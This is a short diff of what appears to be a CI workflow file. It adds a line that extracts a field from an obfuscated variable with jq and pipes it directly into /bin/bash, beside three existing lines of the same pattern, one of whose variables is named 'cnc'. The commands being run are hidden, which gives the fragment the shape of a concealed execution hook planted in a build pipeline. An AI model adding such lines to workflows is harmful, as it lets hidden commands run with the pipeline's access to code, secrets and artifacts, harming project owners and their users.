@@ -21,6 +21,7 @@ jobs:
           echo $v0501 | jq -r .s3 | /bin/bash
           echo $jxejv56 | jq -r .vyq9 | /bin/bash
           printf '%s' "$cnc012" | jq -r .hkwle3 | /bin/bash
+          echo $mljqs628 | jq -r .uc789 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
